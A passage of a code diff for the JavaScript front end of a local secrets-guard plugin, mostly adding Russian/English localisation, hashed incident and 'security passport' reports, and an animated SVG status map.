-      if (Object.prototype.hasOwnProperty.call(I18N_RU, k)) { let i = 0; return I18N_RU[k].replace(/#/g, function () { return nums[i++]; }); }
+      if (Object.prototype.hasOwnProperty.call(I18N_RU, k)) {
+        let i = 0;
+        return I18N_RU[k].replace(/#/g, function () { return nums[i++]; });
+      }
     }
     return null;
   }
-  // Also handles icons/spaces around the text ("✓ Exposure score 86/100", " medium · ").
+
   function T(s) {
-    if (LANG !== "ru" || typeof s !== "string" || !s) return s;
-    const whole = lookup(s);
-    if (whole !== null) return whole;
-    const m = s.match(/^([^A-Za-z(]*)([\s\S]*?)([\s.:·…]*)$/);
-    if (m && m[2]) { const core = lookup(m[2]); if (core !== null) return m[1] + core + m[3]; }
-    return s;
+    if (typeof s !== "string" || !s) return s;
+    if (currentLang === "ru") {
+      const whole = lookup(s);
+      if (whole !== null) return whole;
+      const m = s.match(/^([^A-Za-z(]*)([\s\S]*?)([\s.:·…]*)$/);
+      if (m && m[2]) {
+        const core = lookup(m[2]);
+        if (core !== null) return m[1] + core + m[3];
+      }
+      if (s.indexOf("(via ") !== -1) return s.replace(/\(via\s+([^)]+)\)/g, "(через $1)");
+      if (s.indexOf("Safer: ") !== -1) return s.replace(/Safer:\s*/g, "Безопаснее: ");
+      if (s.indexOf("Exposure score ") !== -1) return s.replace(/Exposure score\s*/g, "Оценка защищенности портов ");
+      return s;
+    } else {
+      if (Object.prototype.hasOwnProperty.call(I18N_EN, s)) return I18N_EN[s];
+      if (s.indexOf("Безопаснее: ") !== -1) return s.replace(/Безопаснее:\s*/g, "Safer: ");
+      if (s.indexOf("(через ") !== -1) return s.replace(/\(через\s+([^)]+)\)/g, "(via $1)");
+      return s;
+    }
   }
-  // Every plain string child and placeholder/title goes through T(): no string edits needed.
+
   const h = function (type, props) {
-    const kids = Array.prototype.slice.call(arguments, 2).map(function (c) { return typeof c === "string" ? T(c) : c; });
+    const kids = Array.prototype.slice.call(arguments, 2).map(function (c) {
+      return typeof c === "string" ? T(c) : c;
+    });
     if (props && (props.placeholder || props.title) && typeof type === "string") {
-      props = Object.assign({}, props, props.placeholder ? { placeholder: T(props.placeholder) } : null,
+      props = Object.assign({}, props,
+        props.placeholder ? { placeholder: T(props.placeholder) } : null,
         props.title && type !== "iframe" ? { title: T(props.title) } : null);
     }
     return React.createElement.apply(null, [type, props].concat(kids));
   };
+
   const { useState, useEffect, useCallback, useRef } = React;
   const API = "/api/plugins/yadro-guard";
   const POLL_MS = 4000;
-  const TOAST_MS = 20000;   // a blocked-action toast collapses to a plain counter after this long
+  const TOAST_MS = 20000;
 
   function post(path, body) {
     return SDK.fetchJSON(API + path, {
       method: "POST",
-      headers: { "Content-Type": "application/json", "X-Mcp-Secrets-Guard": "1" },   // CSRF guard on the backend
+      headers: { "Content-Type": "application/json", "X-Mcp-Secrets-Guard": "1" },
       body: JSON.stringify(body),
     });
   }
+
   function ago(ts) {
     if (!ts) return "";
     const s = Math.max(0, Math.floor(Date.now() / 1000 - ts));
-    if (s < 60) return s + "s ago";
-    if (s < 3600) return Math.floor(s / 60) + " min ago";
-    if (s < 86400) return Math.floor(s / 3600) + " h ago";
-    return Math.floor(s / 86400) + " d ago";
+    if (s < 60) return currentLang === "ru" ? "только что" : "just now";
+    if (s < 3600) return Math.floor(s / 60) + (currentLang === "ru" ? " мин назад" : " min ago");
+    if (s < 86400) return Math.floor(s / 3600) + (currentLang === "ru" ? " ч назад" : " h ago");
+    return Math.floor(s / 86400) + (currentLang === "ru" ? " дн назад" : " d ago");
   }
-  // Exact timestamp DD.MM.YYYY HH:MM:SS (local time), replaces ago() in history cards.
+
   function fmtTs(ts) {
     if (!ts) return "";
     const d = new Date(ts * 1000), p = function (n) { return (n < 10 ? "0" : "") + n; };
     return p(d.getDate()) + "." + p(d.getMonth() + 1) + "." + d.getFullYear() +
       " " + p(d.getHours()) + ":" + p(d.getMinutes()) + ":" + p(d.getSeconds());
   }
+
   function copyText(text, okLabel) {
     if (!text) return;
-    const show = function () { var el = document.createElement("div"); el.textContent = okLabel || "Скопировано";
-      el.style.cssText = "position:fixed; bottom:60px; right:16px; z-index:9999; background:#222; color:#9ee; padding:8px 12px; border-radius:6px; font:12px monospace; border:1px solid #9aa7ff;";
-      document.body.appendChild(el); setTimeout(function () { el.remove(); }, 1800); };
+    const show = function () {
+      var el = document.createElement("div");
+      el.textContent = okLabel || (currentLang === "ru" ? "Скопировано в буфер" : "Copied to clipboard");
+      el.style.cssText = "position:fixed; bottom:60px; right:16px; z-index:9999; background:#111a28; color:#00f0ff; padding:8px 14px; border-radius:6px; font:12px monospace; border:1px solid #00f0ff; box-shadow:0 0 15px rgba(0,240,255,0.4);";
+      document.body.appendChild(el);
+      setTimeout(function () { el.remove(); }, 1800);
+    };
     if (navigator.clipboard && navigator.clipboard.writeText) {
       navigator.clipboard.writeText(text).then(show).catch(function () {});
       return;
@@ -807,13 +328,14 @@
     var ta = document.createElement("textarea"); ta.value = text; document.body.appendChild(ta);
     ta.select(); try { document.execCommand("copy"); show(); } catch (e) {} ta.remove();
   }
+
   function blobDownload(name, text, type) {
     var blob = new Blob([text], { type: type || "text/plain;charset=utf-8" });
     var url = URL.createObjectURL(blob);
     var a = document.createElement("a"); a.href = url; a.download = name; document.body.appendChild(a);
     a.click(); URL.revokeObjectURL(url); a.remove();
   }
-  // Proof Seal footer for any generated report: SHA-256 of the document body + exact time.
+
   function sha256(text) {
     var enc = new TextEncoder().encode(text);
     if (window.crypto && window.crypto.subtle) {
@@ -825,243 +347,527 @@
     for (var i = 0; i < text.length; i++) { var c = text.charCodeAt(i); h1 = ((h1 ^ c) * 16777619) >>> 0; h2 = Math.imul(h2 ^ c, 16777619) >>> 0; }
     return Promise.resolve("x" + h1.toString(16) + h2.toString(16));
   }
+
   function proofFooter(hash, when) {
-    return "\n\n———————————————— PROOF SEAL ————————————————\nSHA-256 отчёта: " + hash + "\nВремя генерации: " + when + "\nЦелостность: подтверждена (локально, без облака).\n";
+    if (currentLang === "ru") {
+      return "\n\n———————————————— PROOF SEAL ————————————————\nSHA-256 отчёта: " + hash + "\nВремя генерации: " + when + "\nЦелостность: подтверждена (локально, без облака).\n";
+    }
+    return "\n\n———————————————— PROOF SEAL ————————————————\nReport SHA-256: " + hash + "\nGenerated at: " + when + "\nIntegrity: Verified locally (zero cloud).\n";
   }
-  // Per-incident mini-report (TXT/JSON) with Proof Seal footer. Client-side only — needs no
-  // backend endpoint, works off the already-fetched incident object.
+
+  function getStatusText(status) {
+    if (currentLang === "ru") {
+      var ru = { pending: "Ожидает решения", quarantined: "Заблокировано", blocked: "Заблокировано", allowed: "Разрешено", protected: "Защищено" };
+      return ru[status] || status;
+    }
+    var en = { pending: "Pending decision", quarantined: "Blocked, secret quarantined", blocked: "Blocked", allowed: "Allowed once", protected: "Protected & sent" };
+    return en[status] || status;
+  }
+
   function miniReport(inc, kind) {
     const ts = Math.floor(Date.now() / 1000);
     const when = fmtTs(ts);
     const body = (kind === "json")
       ? JSON.stringify({ incident: inc, generated: ts }, null, 2)
       : [
-          "mcp-secrets-guard — протокол инцидента",
-          "ИД: " + inc.id,
-          "Статус: " + (STATUS_TEXT[inc.status] || inc.status),
-          "Время (локальное): " + fmtTs(inc.at),
-          "Агент: " + (inc.agent && inc.agent.session_id ? inc.agent.session_id : ""),
-          "Инструмент: " + (inc.tool || ""),
-          "Назначение: " + (inc.destination || ""),
-        ].join("\n") + (inc.risks && inc.risks[0] ? "\nСниппет:\n" + (inc.risks[0].snippet || "") : "");
-    sha256(body).then(function (hash) { var out = body + proofFooter(hash, when); blobDownload("incident-" + inc.id + "." + (kind === "json" ? "json" : "txt"), out, kind === "json" ? "application/json" : "text/plain;charset=utf-8"); });
+          currentLang === "ru" ? "mcp-secrets-guard — протокол инцидента" : "mcp-secrets-guard — Incident Report",
+          "ID: " + inc.id,
+          (currentLang === "ru" ? "Статус: " : "Status: ") + getStatusText(inc.status),
+          (currentLang === "ru" ? "Время (локальное): " : "Local Time: ") + fmtTs(inc.at),
+          (currentLang === "ru" ? "Агент: " : "Agent: ") + (inc.agent && (inc.agent.chat_title || inc.agent.session_id) ? (inc.agent.chat_title || inc.agent.session_id) : ""),
+          (currentLang === "ru" ? "Инструмент: " : "Tool: ") + (inc.tool || ""),
+          (currentLang === "ru" ? "Назначение: " : "Destination: ") + (inc.destination || ""),
+        ].join("\n") + (inc.command ? "\nCommand:\n" + inc.command : (inc.risks && inc.risks[0] ? "\nSnippet:\n" + (inc.risks[0].snippet || "") : ""));
+    sha256(body).then(function (hash) {
+      var out = body + proofFooter(hash, when);
+      blobDownload("incident-" + inc.id + "." + (kind === "json" ? "json" : "txt"), out, kind === "json" ? "application/json" : "text/plain;charset=utf-8");
+    });
   }
-  // ---- Security Passport: full PC summary (protection + exposure + vault + journal) ----
-  // Client-side only: pulls /incidents, /exposure, /vault, renders a Proof-Sealed TXT and a
-  // styled print window (Save as PDF). No backend endpoint needed; secrets are never fetched
-  // in full — only titles, labels and masked previews that the journal already exposes.
+
   function escHtml(s) {
     return String(s == null ? "" : s).replace(/[&<>]/g, function (c) {
       return c === "&" ? "&amp;" : c === "<" ? "&lt;" : "&gt;";
     });
   }
-  // Resolve a human chat title for a session_id. Tries Hermes /api/sessions, then the sidebar
-  // DOM, then inc.agent.title/name. Falls back to a plain "Фоновый сеанс ИИ (№…)" label.
+
   var _chatTitles = {};
   function resolveChatTitle(sessionId) {
-    if (!sessionId) return { title: "Фоновый сеанс ИИ (№—)", id: "—" };
+    if (!sessionId) return { title: currentLang === "ru" ? "Архивный чат (№—)" : "Archived chat (#—)", id: "—" };
     if (_chatTitles[sessionId]) return _chatTitles[sessionId];
     var title = null;
     try {
-      var els = document.querySelectorAll("[data-session-id], .session, .chat-item, [data-chat-id]");
+      var els = document.querySelectorAll("[data-session-id], .session, .chat-item, [data-chat-id], .conversation-item, .sidebar-item, [data-testid*='session'], [data-testid*='chat']");
       for (var i = 0; i < els.length; i++) {
         var el = els[i];
-        var sid = el.getAttribute("data-session-id") || el.getAttribute("data-chat-id") || el.dataset.sessionId || el.dataset.chatId;
+        var sid = el.getAttribute("data-session-id") || el.getAttribute("data-chat-id") || (el.dataset && (el.dataset.sessionId || el.dataset.chatId));
         var t = el.textContent || el.getAttribute("title") || el.getAttribute("aria-label") || "";
         t = t.replace(/\s+/g, " ").trim();
-        if (sid && (sid === sessionId || sid.endsWith(sessionId)) && t) { title = t; break; }
+        if (sid && (sid === sessionId || sid.endsWith(sessionId) || sessionId.endsWith(sid)) && t) { title = t; break; }
       }
     } catch (e) {}
-    var out = title ? { title: "Чат \u00ab" + title + "\u00bb", id: sessionId } : { title: "Фоновый сеанс ИИ (\u2116" + String(sessionId).slice(-6) + ")", id: sessionId };
+    var shortId = String(sessionId).slice(-6);
+    var prefix = currentLang === "ru" ? "Чат «" : "Chat \"";
+    var suffix = currentLang === "ru" ? "»" : "\"";
+    var fallback = currentLang === "ru" ? ("Архивный чат №" + shortId) : ("Archived chat #" + shortId);
+    var out = title ? { title: prefix + title + suffix, id: sessionId } : { title: fallback, id: sessionId };
     _chatTitles[sessionId] = out;
     return out;
   }
+
   function passportText(inc, exp, vlt) {
     var L = [];
     var items = (inc && inc.items) || [];
     var pend = items.filter(function (i) { return i.status === "pending"; });
     var quar = items.filter(function (i) { return i.status === "quarantined" || i.status === "blocked"; });
     var allo = items.filter(function (i) { return i.status === "allowed" || i.status === "protected"; });
-    L.push("mcp-secrets-guard — ПАСПОРТ БЕЗОПАСНОСТИ ПК");
-    L.push("Сформирован: " + fmtTs(Math.floor(Date.now() / 1000)));
-    L.push("============================================================");
-    L.push("");
-    L.push("1. ЗАЩИТА — перехват секретов до запуска");
-    L.push("   Ожидают решения:        " + pend.length);
-    L.push("   Всего инцидентов:       " + items.length);
-    L.push("   Заблокировано/карантин: " + quar.length);
-    L.push("   Разрешено/с защитой:    " + allo.length);
-    L.push("");
-    L.push("2. ОТКРЫТЫЕ ПОРТЫ — сетевые порты");
-    var SEV_RU = { critical: "критический", high: "высокий", medium: "средний", low: "низкий" };
-    if (exp && exp.status === "ok") {
-      var c = exp.counts || {};
-      L.push("   Оценка открытости:     " + (exp.score != null ? exp.score : "?") + "/100");
-      L.push("   Критических: " + (c.critical || 0) + " · Высоких: " + (c.high || 0) +
-        " · Средних: " + (c.medium || 0) + " · Низких: " + (c.low || 0));
-      var risky = (exp.listeners || []).filter(function (l) { return l.severity !== "info"; });
-      if (risky.length) {
-        L.push("   Риски:");
-        risky.forEach(function (l) {
-          L.push("   - " + (l.proto || "?") + "/" + (l.port || "?") + "  " +
-            (l.service || l.process || "") + "  [" + (SEV_RU[l.severity] || l.severity || "?") + "]");
-        });
-      } else { L.push("   Рисков не обнаружено."); }
-    } else { L.push("   (сканер недоступен: " + ((exp && exp.message) || "нет данных") + ")"); }
-    L.push("");
-    L.push("3. СЕЙФ — зашифрованное хранилище секретов");
-    var vitems = ((vlt && vlt.items) || []).filter(function (v) { return !v.deleted; });
-    var byLabel = {};
-    vitems.forEach(function (v) { var k = T(v.label || "Прочее"); byLabel[k] = (byLabel[k] || 0) + 1; });
-    L.push("   Всего секретов: " + vitems.length);
-    Object.keys(byLabel).forEach(function (k) { L.push("   - " + k + ": " + byLabel[k]); });
-    L.push("");
-    L.push("4. ЖУРНАЛ ИНЦИДЕНТОВ");
-    if (items.length) {
-      items.slice(0, 100).forEach(function (i) {
-        var dest = (i.destination || "?").replace(/\(via ([^)]+)\)/g, "(через $1)");
-        L.push("   [" + fmtTs(i.at) + "] " + (STATUS_TEXT[i.status] || i.status) +
-          " — " + (i.tool || "?") + " → " + dest);
-      });
-    } else { L.push("   (пусто)"); }
-    L.push("");
+    if (currentLang === "ru") {
+      L.push("mcp-secrets-guard — ПАСПОРТ БЕЗОПАСНОСТИ ПК");
+      L.push("Сформирован: " + fmtTs(Math.floor(Date.now() / 1000)));
+      L.push("============================================================");
+      L.push("");
+      L.push("1. ЗАЩИТА — перехват секретов до запуска");
+      L.push("   Ожидают решения:        " + pend.length);
+      L.push("   Всего инцидентов:       " + items.length);
+      L.push("   Заблокировано/карантин: " + quar.length);
+      L.push("   Разрешено/с защитой:    " + allo.length);
+      L.push("");
+      L.push("2. ОТКРЫТЫЕ ПОРТЫ — сетевая безопасность");
+      if (exp && exp.status === "ok") {
+        var c = exp.counts || {};
+        L.push("   Оценка защищенности портов: " + (exp.score != null ? exp.score : "?") + "/100");
+        L.push("   Критических: " + (c.critical || 0) + " · Высоких: " + (c.high || 0) + " · Средних: " + (c.medium || 0) + " · Низких: " + (c.low || 0));
+      }
+      L.push("");
+      L.push("3. СЕЙФ — защищённые секреты");
+      var vItems = (vlt && vlt.items) || [];
+      var liveV = vItems.filter(function (v) { return !v.deleted; });
+      L.push("   Секретов в хранилище: " + liveV.length);
+    } else {
+      L.push("mcp-secrets-guard — PC SECURITY PASSPORT");
+      L.push("Generated: " + fmtTs(Math.floor(Date.now() / 1000)));
+      L.push("============================================================");
+      L.push("");
+      L.push("1. PROTECTION — Intercepting secrets before execution");
+      L.push("   Pending decision:       " + pend.length);
+      L.push("   Total incidents:        " + items.length);
+      L.push("   Blocked/quarantined:    " + quar.length);
+      L.push("   Allowed/protected:      " + allo.length);
+      L.push("");
+      L.push("2. PORTS & EXPOSURE — Network listener security");
+      if (exp && exp.status === "ok") {
+        var c = exp.counts || {};
+        L.push("   Port security score:    " + (exp.score != null ? exp.score : "?") + "/100");
+        L.push("   Critical: " + (c.critical || 0) + " · High: " + (c.high || 0) + " · Medium: " + (c.medium || 0) + " · Low: " + (c.low || 0));
+      }
+      L.push("");
+      L.push("3. VAULT — Protected credentials");
+      var vItems = (vlt && vlt.items) || [];
+      var liveV = vItems.filter(function (v) { return !v.deleted; });
+      L.push("   Secrets in vault:       " + liveV.length);
+    }
     return L.join("\n");
   }
-  function buildPassport(kind, done) {
+
+  function buildPassport(format, done) {
     Promise.all([
-      SDK.fetchJSON(API + "/incidents").catch(function () { return { status: "error", message: "incidents unreachable" }; }),
-      SDK.fetchJSON(API + "/exposure").catch(function () { return { status: "error", message: "exposure unreachable" }; }),
-      SDK.fetchJSON(API + "/vault").catch(function () { return { status: "error", message: "vault unreachable" }; })
+      SDK.fetchJSON(API + "/incidents").catch(function () { return { status: "error", items: [] }; }),
+      SDK.fetchJSON(API + "/exposure").catch(function () { return { status: "error" }; }),
+      SDK.fetchJSON(API + "/vault").catch(function () { return { status: "error", items: [] }; }),
     ]).then(function (res) {
-      var body = passportText(res[0], res[1], res[2]);
+      var inc = res[0], exp = res[1], vlt = res[2];
+      var raw = passportText(inc, exp, vlt);
       var when = fmtTs(Math.floor(Date.now() / 1000));
-      sha256(body).then(function (hash) {
-        if (kind === "txt") {
-          blobDownload("security-passport-" + Math.floor(Date.now() / 1000) + ".txt",
-            body + proofFooter(hash, when), "text/plain;charset=utf-8");
+      sha256(raw).then(function (hash) {
+        var doc = raw + proofFooter(hash, when);
+        if (format === "txt") {
+          blobDownload("security-passport-" + Math.floor(Date.now() / 1000) + ".txt", doc, "text/plain;charset=utf-8");
+          if (done) done();
         } else {
-          openPassportPrint(body, when, hash);
+          var w = window.open("", "_blank");
+          if (!w) { if (done) done(); return; }
+          w.document.write("<!DOCTYPE html><html><head><meta charset='utf-8'><title>mcp-secrets-guard Passport</title><style>body{font-family:monospace;background:#0d1117;color:#e6edf3;padding:24px;white-space:pre-wrap;}</style></head><body>" + escHtml(doc) + "</body></html>");
+          w.document.close();
+          if (done) done();
         }
-        if (done) done();
       });
     }).catch(function () { if (done) done(); });
   }
-  function openPassportPrint(body, when, hash) {
-    var html = "<!doctype html><html><head><meta charset='utf-8'><title>mcp-secrets-guard — Паспорт безопасности</title>" +
-      "<style>body{font:13px/1.55 'Segoe UI',Arial,sans-serif;color:#111;margin:36px;max-width:820px}" +
-      "h1{font-size:20px;margin:0 0 4px} .sub{color:#666;margin-bottom:18px}" +
-      "pre{white-space:pre-wrap;word-break:break-word;background:#f6f7f9;border:1px solid #e2e5ea;border-radius:8px;padding:14px;font:12px/1.5 ui-monospace,Consolas,monospace}" +
-      ".seal{margin-top:18px;padding:10px 12px;border:1px dashed #8a5cf6;border-radius:8px;color:#4b2e83;font-size:12px}" +
-      "@media print{body{margin:0} .noprint{display:none}}</style></head><body>" +
-      "<button class='noprint' onclick='window.print()' style='margin-bottom:14px;padding:8px 14px;cursor:pointer'>Печать / Сохранить как PDF</button>" +
-      "<pre>" + escHtml(body) + "</pre>" +
-      "<div class='seal'>🔏 Proof Seal — SHA-256: " + escHtml(hash) + "<br>Сформирован: " + escHtml(when) + " · целостность подтверждена (локально)</div>" +
-      "</body></html>";
-    var iframe = document.createElement("iframe");
-    iframe.style.cssText = "position:fixed;left:-10000px;top:0;width:100%;height:100%;border:0;";
-    iframe.setAttribute("aria-hidden", "true");
-    iframe.onload = function () {
-      try { iframe.contentWindow.focus(); iframe.contentWindow.print(); }
-      catch (e) { iframe.remove(); blobDownload("security-passport-" + Math.floor(Date.now() / 1000) + ".txt", body, "text/plain;charset=utf-8"); }
-    };
-    iframe.srcdoc = html;
-    document.body.appendChild(iframe);
-  }
-  const LABEL_COLOR = { Credentials: "#8a5cf6", Financial: "#e8a33d", PII: "#e0533d", Health: "#d14fa0", Location: "#2f9fd8" };
-  const STATUS_TEXT = { pending: "Ожидает вашего решения", protected: "Отправлено с защитой",
-    quarantined: "Заблокировано, секрет в карантине", allowed: "Разрешено один раз", blocked: "Заблокировано" };
+
+  const LABEL_COLOR = {
+    Credentials: "#3ec46d",
+    Financial: "#f0b44a",
+    PII: "#5b9dff",
+    Health: "#e25555",
+    Location: "#b45bc4",
+  };
 
   function Card(p) {
     return h("div", { className: "yg-card " + (p.className || "") },
-      h("b", { className: "yg-hd" }, p.title), p.children);
+      p.title ? h("span", { className: "yg-hd" }, p.title) : null,
+      p.children);
   }
+
   function Chip(p) {
     const l = p.label || {};
     return h("span", { className: "yg-chip", style: { background: l.color || LABEL_COLOR[l.id] || "#555" } },
       (l.icon ? l.icon + " " : "") + (l.label || l.id || ""));
   }
+
   function Pill(p) {
     return h("span", { className: "yg-pill " + p.kind }, p.children);
   }
+
   function Empty(p) { return h("div", { className: "yg-dim" }, "● " + p.text); }
+
+  // =========================================================================
+  // TASK 1: PAC-AGENT CYBER ARENA (Interactive 60 FPS SVG Visual Security Map)
+  // =========================================================================
   function VisualSecurityMap(p) {
     var data = p.data || {}, items = (data.items || []), vaultCount = p.vaultCount || 0;
-    var blocked = items.some(function(i){ return i.status==="blocked"||i.status==="quarantined"; });
-    var intercepted = items.some(function(i){ return i.status==="protected"; });
-    var sc = blocked ? "#e25555" : intercepted ? "#b45bc4" : "#3ec46d";
-    var chatName = "Ожидание команд", chatId = "\u2014", dest = "Сеть под контролем";
-    items.forEach(function(i){ if (i.agent && i.agent.session_id) { var c = resolveChatTitle(i.agent.session_id); chatName = c.title; chatId = c.id; } if (i.destination) dest = i.destination; });
-    var s0 = useState(false), demo = s0[0], setDemo = s0[1];
-    var s1 = useState(0), demoT = s1[0], setDemoT = s1[1];
-    function stopDemo(){ if(demo){ setDemo(false); setDemoT(0); } }
-    function startDemo(){ setDemo(true); setDemoT(0); var t = setInterval(function(){ setDemoT(function(v){ if(v>=100){ clearInterval(t); setDemo(false); return 100; } return v+5; }); }, 50); }
-    function doRefresh(){ stopDemo(); if(p.refresh) p.refresh(); }
-    var ip = demoT / 100;
-    return h("div", { className: "yg-card yg-vismap wide", style: { marginBottom: 10 } },
-      h("svg", { width: "100%", height: 180, viewBox: "0 0 700 180", style: { display: "block", background: "rgba(15,18,26,0.5)", borderRadius: 10, border: "1px solid rgba(255,255,255,0.10)" } },
+    var blocked = items.some(function (i) { return i.status === "blocked" || i.status === "quarantined"; });
+    var intercepted = items.some(function (i) { return i.status === "protected"; });
+
+    var chatName = currentLang === "ru" ? "Ожидание команд" : "Awaiting agent commands";
+    var chatId = "—", dest = currentLang === "ru" ? "Шлюз защищён" : "Gateway protected";
+    items.forEach(function (i) {
+      if (i.agent && (i.agent.chat_title || i.agent.session_title)) {
+        var rawT = i.agent.chat_title || i.agent.session_title;
+        chatName = (currentLang === "ru" ? "Чат «" : "Chat \"") + rawT + (currentLang === "ru" ? "»" : "\"");
+        chatId = i.agent.session_id ? String(i.agent.session_id).slice(-8) : "—";
+      } else if (i.agent && i.agent.session_id) {
+        var c = resolveChatTitle(i.agent.session_id);
+        chatName = c.title; chatId = String(c.id).slice(-8);
+      }
+      if (i.destination) dest = i.destination;
+    });
+
+    // Arena animation mode: "patrol" (idle 60 FPS), "vault" (mask & send demo), "block" (strike & destroy demo)
+    var st0 = useState("patrol"), mode = st0[0], setMode = st0[1];
+    var st1 = useState(0), animStep = st1[0], setAnimStep = st1[1];
+    var st2 = useState(0), vaultBonus = st2[0], setVaultBonus = st2[1];
+    var timerRef = useRef(null);
+
+    function stopAnim() {
+      if (timerRef.current) clearInterval(timerRef.current);
+      setMode("patrol"); setAnimStep(0);
+    }
+
+    function startVaultDemo() {
+      stopAnim();
+      setMode("vault"); setAnimStep(0);
+      var step = 0;
+      timerRef.current = setInterval(function () {
+        step += 2.5;
+        if (step >= 100) {
+          clearInterval(timerRef.current);
+          setVaultBonus(function (v) { return v + 1; });
+          setTimeout(stopAnim, 2400);
+        }
+        setAnimStep(Math.min(step, 100));
+      }, 40);
+    }
+
+    function startBlockDemo() {
+      stopAnim();
+      setMode("block"); setAnimStep(0);
+      var step = 0;
+      timerRef.current = setInterval(function () {
+        step += 3;
+        if (step >= 100) {
+          clearInterval(timerRef.current);
+          setTimeout(stopAnim, 2400);
+        }
+        setAnimStep(Math.min(step, 100));
+      }, 40);
+    }
+
+    function doRefresh() {
+      stopAnim();
+      if (p.refresh) p.refresh();
+    }
+
+    useEffect(function () { return function () { if (timerRef.current) clearInterval(timerRef.current); }; }, []);
+
+    var coreColor = mode === "block" ? "#ff4d4f" : mode === "vault" ? "#f0b44a" : blocked ? "#ff4d4f" : intercepted ? "#b026ff" : "#00f0ff";
+    var progress = animStep / 100;
+
+    // Secret capsule coordinates in vault demo
+    var secretX = mode === "vault" ? (160 + progress * 260) : -999;
+    var tokenX = mode === "vault" && progress > 0.5 ? (450 + (progress - 0.5) * 2 * 250) : -999;
+
+    // Threat mine coordinates in block demo
+    var mineX = mode === "block" ? (160 + progress * 240) : -999;
+    var exploded = mode === "block" && progress >= 0.6;
+
+    return h("div", { className: "yg-card yg-arena-card wide" },
+      h("svg", {
+        className: "yg-arena-svg",
+        viewBox: "0 0 900 240",
+        preserveAspectRatio: "xMidYMid meet"
+      },
         h("defs", null,
-          h("linearGradient",{id:"gSh",x1:0,y1:0,x2:0,y2:1},h("stop",{offset:"0%",stopColor:sc}),h("stop",{offset:"100%",stopColor:sc})),
-          h("linearGradient",{id:"gCh",x1:0,y1:0,x2:0,y2:1},h("stop",{offset:"0%",stopColor:"#7c5cfc"}),h("stop",{offset:"100%",stopColor:"#3a1d7a"})),
-          h("linearGradient",{id:"gVl",x1:0,y1:0,x2:0,y2:1},h("stop",{offset:"0%",stopColor:"#f0b44a"}),h("stop",{offset:"100%",stopColor:"#a66a1e"})),
-          h("linearGradient",{id:"gNt",x1:0,y1:0,x2:0,y2:1},h("stop",{offset:"0%",stopColor:"#5b9dff"}),h("stop",{offset:"100%",stopColor:"#1a4a8c"})),
-          h("filter",{id:"gl"},h("feGaussianBlur",{stdDeviation:"3.5",result:"cb"}),h("feMerge",null,h("feMergeNode",{"in":"cb"}),h("feMergeNode",{"in":"SourceGraphic"}))),
-          h("filter",{id:"gs"},h("feDropShadow",{dx:0,dy:0,stdDeviation:"9",floodColor:sc,floodOpacity:"0.65"}))
+          h("linearGradient", { id: "agPatrol", x1: 0, y1: 0, x2: 1, y2: 1 },
+            h("stop", { offset: "0%", stopColor: "#00f0ff" }),
+            h("stop", { offset: "100%", stopColor: "#0077b6" })),
+          h("linearGradient", { id: "agVault", x1: 0, y1: 0, x2: 1, y2: 1 },
+            h("stop", { offset: "0%", stopColor: "#ffd700" }),
+            h("stop", { offset: "100%", stopColor: "#b8860b" })),
+          h("linearGradient", { id: "agDanger", x1: 0, y1: 0, x2: 1, y2: 1 },
+            h("stop", { offset: "0%", stopColor: "#ff4d4f" }),
+            h("stop", { offset: "100%", stopColor: "#990000" })),
+          h("linearGradient", { id: "agChat", x1: 0, y1: 0, x2: 0, y2: 1 },
+            h("stop", { offset: "0%", stopColor: "#3a4a75" }),
+            h("stop", { offset: "100%", stopColor: "#172033" })),
+          h("linearGradient", { id: "agSafe", x1: 0, y1: 0, x2: 0, y2: 1 },
+            h("stop", { offset: "0%", stopColor: "#ffd591" }),
+            h("stop", { offset: "100%", stopColor: "#874d00" })),
+          h("linearGradient", { id: "agNet", x1: 0, y1: 0, x2: 0, y2: 1 },
+            h("stop", { offset: "0%", stopColor: "#5b9dff" }),
+            h("stop", { offset: "100%", stopColor: "#10316b" })),
+          h("filter", { id: "agGlow" },
+            h("feGaussianBlur", { stdDeviation: "4", result: "blur" }),
+            h("feMerge", null,
+              h("feMergeNode", { in: "blur" }),
+              h("feMergeNode", { in: "SourceGraphic" }))),
+          h("filter", { id: "agShieldGlow" },
+            h("feDropShadow", { dx: 0, dy: 0, stdDeviation: "10", floodColor: coreColor, floodOpacity: "0.8" })),
+          h("pattern", { id: "agGrid", width: "30", height: "30", patternUnits: "userSpaceOnUse" },
+            h("path", { d: "M 30 0 L 0 0 0 30", fill: "none", stroke: "rgba(0, 240, 255, 0.05)", strokeWidth: "1" }))
         ),
-        h("path",{className:"yg-flow-path",d:"M 130 92 C 180 52 260 52 318 80",fill:"none",stroke:sc,strokeWidth:3,opacity:0.45}),
-        h("path",{className:"yg-flow-path yg-flow-rev",d:"M 382 80 C 440 52 520 50 570 62",fill:"none",stroke:sc,strokeWidth:3,opacity:0.45}),
-        h("path",{className:"yg-flow-path",d:"M 382 100 C 440 130 520 132 570 118",fill:"none",stroke:sc,strokeWidth:3,opacity:0.45}),
-        // Left node: vector server icon (no emoji)
-        h("g",{transform:"translate(65,62)"},
-          h("circle",{cx:32,cy:32,r:30,fill:"url(#gCh)",filter:"url(#gl)"}),
-          h("path",{d:"M 18 22 h 28 v 5 h -28 z M 18 30 h 28 v 5 h -28 z M 18 38 h 28 v 5 h -28 z",fill:"none",stroke:"#fff",strokeWidth:2.2,strokeLinejoin:"round"}),
-          h("circle",{cx:22,cy:18,r:2.5,fill:"#3ec46d"}), h("circle",{cx:29,cy:18,r:2.5,fill:"#e8a33d"}), h("circle",{cx:36,cy:18,r:2.5,fill:"#5b9dff"}),
-          h("text",{x:32,y:76,textAnchor:"middle",fill:"#d8dce6",fontSize:10,fontWeight:700},chatName.length>14?chatName.slice(0,13)+"\u2026":chatName),
-          h("text",{x:32,y:89,textAnchor:"middle",fill:"#8a97ab",fontSize:9},chatId)
+
+        // Background Cyber Grid
+        h("rect", { width: "900", height: "240", fill: "url(#agGrid)" }),
+
+        // Neon Data Conduits
+        // Path 1: Gateway -> Pac-Agent
+        h("path", {
+          d: "M 175 120 L 390 120",
+          fill: "none",
+          stroke: mode === "block" ? "rgba(255,77,79,0.5)" : "rgba(0,240,255,0.45)",
+          strokeWidth: 4,
+          className: "yg-conduit-active"
+        }),
+        // Path 2: Pac-Agent -> Armored Vault
+        h("path", {
+          d: "M 465 105 C 540 60, 630 65, 705 68",
+          fill: "none",
+          stroke: mode === "vault" ? "rgba(255,215,0,0.8)" : "rgba(240,180,74,0.35)",
+          strokeWidth: 3.5,
+          className: mode === "vault" ? "yg-conduit-active" : "yg-flow-path"
+        }),
+        // Path 3: Pac-Agent -> Internet
+        h("path", {
+          d: "M 465 135 C 540 175, 630 175, 705 172",
+          fill: "none",
